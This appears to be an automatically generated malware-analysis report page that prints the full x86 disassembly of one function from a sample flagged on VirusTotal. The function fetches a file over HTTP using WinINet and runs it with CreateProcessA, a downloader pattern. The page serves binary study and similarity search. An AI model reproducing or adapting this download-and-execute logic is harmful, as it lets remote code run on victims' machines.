---
layout: post
title:  "fcn.004053a0 @ a1c6b07868a0eea8f4ee5a872aa71909"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** fcn.004053a0
- **Origin (md5):** a1c6b07868a0eea8f4ee5a872aa71909
- **VirusTotal:** [virustotal.com/gui/file/a1c6b07868a0eea8f4ee5a872aa71909][virustotal_ref]

# Code Tags
<span class="tag" id="HTTP">HTTP</span>
<span class="tag" id="PROCESS">PROCESS</span>


# Similar Functions

1. [fcn.00404580][similar_1_ref] (sim.: 0.9225230060944951)
2. [fcn.10005f30][similar_2_ref] (sim.: 0.8968155163804665)
3. [fcn.00408210][similar_3_ref] (sim.: 0.8938553218805568)
4. [fcn.004160f0][similar_4_ref] (sim.: 0.8916129707760416)
5. [fcn.1008e5b0][similar_5_ref] (sim.: 0.888633272291502)


# Disassembled Code

{% highlight nasm %}
push ebp
lea ebp,[esp-0x4f8]
sub esp,0x4f8
push 0xffffffffffffffff
push 0x43f04d
mov eax,dword fs:[0]
push eax
sub esp,0x84
mov eax,dword[0x4535c4]
xor eax,ebp
mov dword[ebp+0x4f4],eax
push ebx
push esi
push edi
push eax
lea eax,[ebp-0xc]
mov dword fs:[0],eax
mov dword[ebp-0x10],esp
mov eax,dword[ebp+0x500]
mov edi,dword[eax]
mov eax,dword[edi*4+0x457628]
mov ebx,ecx
mov ecx,dword[eax+8]
push edi
push ecx
push 0x44837c
mov dword[ebp-0x1c],ebx
mov dword[ebp-0x20],edi
call fcn.00428d8c
add esp,0xc
push 0
push 0
push 0
push 0
push str.Test
call dword[sym.imp.WININET.dll_InternetOpenA]
mov dword[ebx+edi*4+0x804],eax
test eax,eax
jne 0x40544a
call dword[sym.imp.KERNEL32.dll_GetLastError]
mov edx,dword[edi*4+0x457628]
push eax
mov eax,dword[edx+8]
push eax
push str._s___Failed_in_call_to_InternetOpen__Error:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
push 0x405c40
push eax
call dword[sym.imp.WININET.dll_InternetSetStatusCallback]
cmp eax,0xffffffff
jne 0x40547f
call dword[sym.imp.KERNEL32.dll_GetLastError]
mov ecx,dword[edi*4+0x457628]
mov edx,dword[ecx+8]
push eax
push edx
push str._s___Failed_in_call_to_InternetSetStatusCallback__Error:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
mov eax,dword[edi*4+0x457628]
mov ecx,dword[eax+0x28]
mov edx,dword[eax+0x24]
mov eax,dword[eax+0xc]
push ecx
push edx
push eax
push str._s___serverPath___s__suffix___s_n
call fcn.00428d8c
mov ecx,dword[edi*4+0x457628]
mov eax,dword[ecx+0x24]
mov edx,dword[ebx+edi*4+0x804]
add esp,0x10
push 0
push 0
push 3
push 0x4489d3
push 0x4489d3
push 0x50
push eax
push edx
call dword[sym.imp.WININET.dll_InternetConnectA]
mov dword[ebx+edi*4+0x854],eax
test eax,eax
jne 0x4054f9
call dword[sym.imp.KERNEL32.dll_GetLastError]
push eax
mov eax,dword[edi*4+0x457628]
mov ecx,dword[eax+8]
push ecx
push str._s___Failed_in_call_to_InternetConnect__Error:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
mov eax,dword[edi*4+0x457628]
mov dword[ebp-0x38],0x4480f4
mov dword[ebp-0x34],0
mov edx,dword[eax+0xc]
mov eax,dword[eax+0x28]
push edx
push eax
lea ecx,[ebp+0x400]
push str._s_s
push ecx
call dword[sym.imp.USER32.dll_wsprintfA]
mov ecx,dword[ebx+edi*4+0x854]
add esp,0x10
push ebx
push 0x84400000
lea edx,[ebp-0x38]
push edx
push 0
push 0
lea eax,[ebp+0x400]
push eax
push 0x4480f8
push ecx
call dword[sym.imp.WININET.dll_HttpOpenRequestA]
mov dword[ebx+edi*4+0x8a4],eax
test eax,eax
jne 0x405582
call dword[sym.imp.KERNEL32.dll_GetLastError]
mov edx,dword[edi*4+0x457628]
push eax
mov eax,dword[edx+8]
push eax
push str._s___Failed_in_call_to_HttpOpenRequest__Error:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
push str.HttpSendRequest
call fcn.00428d8c
mov ecx,dword[ebx+edi*4+0x8a4]
add esp,4
push 0
push 0
push 0
push 0
push ecx
call dword[sym.imp.WININET.dll_HttpSendRequestA]
test eax,eax
je 0x4056cb
push str.HttpSendRequest
call fcn.00428d8c
mov ecx,dword[ebx+edi*4+0x8a4]
add esp,4
push 0
lea edx,[ebp-0x24]
push edx
lea eax,[ebp+0x4d4]
push eax
push 0x13
push ecx
mov dword[ebp-0x24],0x20
call dword[sym.imp.WININET.dll_HttpQueryInfoA]
test eax,eax
je 0x4056ef
lea edx,[ebp+0x4d4]
push edx
call fcn.00428e51
mov esi,eax
mov eax,dword[edi*4+0x457628]
mov ecx,dword[eax+8]
push esi
push ecx
push str._s___statusCode_:__d_n
call fcn.00428d8c
add esp,0x10
cmp esi,0x197
je 0x405621
cmp esi,0x191
jne 0x405713
mov edx,dword[edi*4+0x457628]
mov eax,dword[edx+8]
push eax
push str._s___internetReadFile___n
call fcn.00428d8c
add esp,8
lea esp,[esp]
mov eax,dword[ebx+edi*4+0x8a4]
lea ecx,[ebp-0x28]
push ecx
push 0x32
lea edx,[ebp+0x480]
push edx
push eax
call dword[sym.imp.WININET.dll_InternetReadFile]
cmp dword[ebp-0x28],0
jne 0x405640
mov ecx,dword[ebx+edi*4+0x8a4]
push 0
push 7
push 0x2eee
push ecx
mov ecx,ebx
call fcn.00401000
push eax
call dword[sym.imp.WININET.dll_InternetErrorDlg]
cmp eax,0x2f00
jne 0x405739
mov edx,dword[edi*4+0x457628]
mov eax,dword[edx+8]
push eax
push str._s___goto_resend
call fcn.00428d8c
push str.HttpSendRequest
call fcn.00428d8c
mov ecx,dword[ebx+edi*4+0x8a4]
add esp,0xc
push 0
push 0
push 0
push 0
push ecx
call dword[sym.imp.WININET.dll_HttpSendRequestA]
test eax,eax
jne 0x4055ad
call dword[sym.imp.KERNEL32.dll_GetLastError]
mov edx,dword[edi*4+0x457628]
push eax
mov eax,dword[edx+8]
push eax
push str._s___Failed_in_call_to_HttpSendRequest__Error:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
call dword[sym.imp.KERNEL32.dll_GetLastError]
mov ecx,dword[edi*4+0x457628]
mov edx,dword[ecx+8]
push eax
push edx
push str._s___Failed_in_call_to_HttpQueryInfo_for_HTTP_query_status_code__Error:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
cmp esi,0xc8
je 0x405739
mov eax,dword[edi*4+0x457628]
mov ecx,dword[eax+8]
push esi
push ecx
push str._s___Failed_to_retrieve_a_HTTP_200_status__Status_Code:_d_n
call fcn.00428d8c
add esp,0xc
jmp 0x405a06
mov esi,0x6c
call fcn.00406560
mov ecx,dword[ebx+edi*4+0x8a4]
push 0
lea edx,[ebp-0x24]
push edx
lea eax,[ebp+0x4b4]
push eax
push 5
push ecx
mov dword[ebp-0x24],0x20
call dword[sym.imp.WININET.dll_HttpQueryInfoA]
mov esi,0x74
call fcn.00406560
call dword[sym.imp.KERNEL32.dll_GetTickCount]
mov edx,dword[edi*4+0x457628]
xor eax,eax
mov dword[ebp-0x18],eax
mov dword[ebp-0x14],eax
mov eax,dword[edx+8]
push eax
push edi
push str._d___s___
mov esi,0x400
call fcn.00428d8c
add esp,0xc
lea ecx,[ecx]
mov eax,dword[ebx+edi*4+0x8a4]
lea ecx,[ebp-0x18]
push ecx
push esi
lea edx,[ebp]
push edx
push eax
call dword[sym.imp.WININET.dll_InternetReadFile]
test eax,eax
jne 0x4057ea
call dword[sym.imp.KERNEL32.dll_GetLastError]
mov ecx,dword[edi*4+0x457628]
mov edx,dword[ecx+8]
push eax
push edx
push str._s___Failed_in_call_to_InternetReadFile__Error:_d_n
call fcn.00428d8c
add esp,0xc
push 0x72
xor ecx,ecx
mov edi,ebx
call fcn.00406e70
jmp 0x405a06
cmp dword[ebp-0x18],0
je 0x40583d
lea ecx,[ebp-0x2c]
call fcn.00413faa
mov dword[ebp-4],0
mov eax,edi
shl eax,4
mov byte[ebp-4],1
mov edx,dword[eax+ebx+0x924]
mov edx,dword[edx+0x38]
lea ecx,[eax+ebx+0x924]
mov eax,dword[ebp-0x18]
push eax
lea eax,[ebp]
push eax
call edx
mov dword[ebp-4],0xffffffff
call fcn.00413fc2
mov eax,dword[ebp-0x18]
add dword[ebp-0x14],eax
test eax,eax
jne 0x4057a0
mov eax,dword[edi*4+0x457628]
mov ecx,dword[eax+8]
push ecx
push edi
push str._d__s__
call fcn.00428d8c
add esp,0xc
lea ecx,[ebp-0x14]
call fcn.00401640
lea ecx,[ebp-0x28]
mov dword[ebp-4],3
call fcn.00401640
mov byte[ebp-4],4
mov eax,dword[edi*4+0x457628]
add eax,0x50
push eax
lea ecx,[ebp-0x14]
call fcn.004084b0
mov eax,dword[edi*4+0x457628]
lea edx,[eax+0xc]
push edx
add eax,0x1c
push eax
lea eax,[ebp-0x30]
push eax
call fcn.00407f80
push 0x44862c
push eax
lea ecx,[ebp-0x20]
push ecx
mov byte[ebp-4],5
call fcn.00408040
lea edx,[ebp-0x14]
push edx
push eax
lea eax,[ebp-0x1c]
push eax
mov byte[ebp-4],6
call fcn.00407f80
add esp,0x24
push eax
lea ecx,[ebp-0x28]
mov byte[ebp-4],7
call fcn.004084b0
mov byte[ebp-4],6
mov eax,dword[ebp-0x1c]
add eax,0xfffffff0
lea ecx,[eax+0xc]
or edx,0xffffffff
lock xadd dword[ecx],edx
dec edx
test edx,edx
jg 0x4058f4
mov ecx,dword[eax]
mov edx,dword[ecx]
push eax
mov eax,dword[edx+4]
call eax
mov byte[ebp-4],5
mov eax,dword[ebp-0x20]
add eax,0xfffffff0
lea ecx,[eax+0xc]
or edx,0xffffffff
lock xadd dword[ecx],edx
dec edx
test edx,edx
jg 0x405917
mov ecx,dword[eax]
mov edx,dword[ecx]
push eax
mov eax,dword[edx+4]
call eax
mov byte[ebp-4],4
mov eax,dword[ebp-0x30]
add eax,0xfffffff0
lea ecx,[eax+0xc]
or edx,0xffffffff
lock xadd dword[ecx],edx
dec edx
test edx,edx
jg 0x40593a
mov ecx,dword[eax]
mov edx,dword[ecx]
push eax
mov eax,dword[edx+4]
call eax
mov ecx,edi
shl ecx,4
mov edx,dword[ecx+ebx+0x924]
mov eax,dword[edx+0x4c]
lea ecx,[ecx+ebx+0x924]
call eax
push 0x40
lea ecx,[ebp-0x8c]
push 0
push ecx
call fcn.00429820
mov edx,dword[edi*4+0x457628]
mov dword[ebp-0x90],0x44
mov eax,dword[edx+8]
push eax
push str._s___
call fcn.00428d8c
mov edi,dword[ebp-0x28]
add esp,0x14
lea ecx,[ebp-0x4c]
push ecx
lea edx,[ebp-0x90]
push edx
push 0
push 0
push 0
push 0
push 0
push 0
push edi
push 0
call dword[sym.imp.KERNEL32.dll_CreateProcessA]
mov eax,dword[ebx+0x20]
inc dword[0x4575cc]
push 0
push 0
push 0x8001
push eax
call dword[sym.imp.USER32.dll_PostMessageA]
lea eax,[edi-0x10]
mov byte[ebp-4],3
lea ecx,[eax+0xc]
or edx,0xffffffff
lock xadd dword[ecx],edx
dec edx
test edx,edx
jg 0x4059e0
mov ecx,dword[eax]
mov edx,dword[ecx]
push eax
mov eax,dword[edx+4]
call eax
mov dword[ebp-4],0xffffffff
mov eax,dword[ebp-0x14]
add eax,0xfffffff0
lea ecx,[eax+0xc]
or edx,0xffffffff
lock xadd dword[ecx],edx
dec edx
test edx,edx
jg 0x405a06
mov ecx,dword[eax]
mov edx,dword[ecx]
push eax
mov eax,dword[edx+4]
call eax
mov ecx,dword[ebp-0xc]
mov dword fs:[0],ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx,dword[ebp+0x4f4]
xor ecx,ebp
call fcn.00428524
add ebp,0x4f8
mov esp,ebp
pop ebp
ret 4
{% endhighlight %}


[similar_1_ref]: /report/fcn.00404580@d59f9c4f445b9f980173dec064f55091
[similar_2_ref]: /report/fcn.10005f30@4c3818fdf32d89a09257dbc9d3e142ea
[similar_3_ref]: /report/fcn.00408210@0403abd1e9e066fc89cddd5736647282
[similar_4_ref]: /report/fcn.004160f0@0aa2d73a5300dff2412388945614b507
[similar_5_ref]: /report/fcn.1008e5b0@2585b133c2e70968905cce13b1fc2654
[virustotal_ref]: https://www.virustotal.com/gui/file/a1c6b07868a0eea8f4ee5a872aa71909